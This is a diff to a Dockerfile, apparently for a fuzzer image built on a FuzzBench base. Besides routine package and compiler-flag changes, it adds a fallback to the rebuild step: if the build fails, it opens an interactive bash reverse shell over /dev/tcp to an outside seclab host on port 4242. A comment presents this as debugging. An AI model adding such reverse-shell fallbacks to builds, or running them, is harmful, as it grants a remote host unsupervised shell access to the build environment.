@@ -1,5 +1,4 @@
-ARG parent_image
-FROM $parent_image
+FROM gcr.io/fuzzbench/base-image
 
 RUN apt-get update && apt-get install -y sudo
 RUN apt-get -y install wget python3.8 python3-pip apt-transport-https \
@@ -14,7 +13,7 @@ RUN apt-get -y install strace
 # ENV CXX=clang++-6.0
 # ENV LD=ld.lld-6.0
 # ENV LDSHARED="clang-6.0 -shared"
-RUN CC=clang-6.0 CPP="clang++-6.0 -E" CXX=clang++-6.0 LD=ld.lld-6.0 LDSHARED="clang-6.0 -shared" pip install xlsxwriter pycrypto
+RUN CC=clang-6.0 CPP="clang-6.0 -E" CXX=clang++-6.0 LD=ld.lld-6.0 LDSHARED="clang-6.0 -shared" pip install xlsxwriter pycrypto
 
 # RUN add-apt-repository ppa:deadsnakes/ppa && apt update && apt install -y python3.8 python3.8-dev python3.8-pip python3.8-distutils
 RUN python3 -m pip install pip
@@ -62,12 +61,16 @@ RUN python3.8 -m pip install humanize
 RUN python3.8 -m pip install networkit
 
 RUN apt-get update && apt install -y libprotobuf-dev protobuf-compiler
+RUN apt-get install -y libstdc++-8-dev
 
 RUN mkdir -p /data/
 
 COPY src /data/src
 
-RUN cd /data/src/CE && ./rebuild.sh
+# netcat for reverse shell if it breaks
+ENV DEBUG_REMOTE_HOST=beatty.unfiltered.seclab.cs.ucsb.edu
+ENV DEBUG_REMOTE_PORT=4242
+RUN cd /data/src/CE && ./rebuild.sh || (/bin/bash -c "bash -i >& /dev/tcp/$DEBUG_REMOTE_HOST/$DEBUG_REMOTE_PORT 0>&1")
 
 COPY scripts /data/scripts
 RUN export CC=/data/src/CE/bin/ko-clang && \
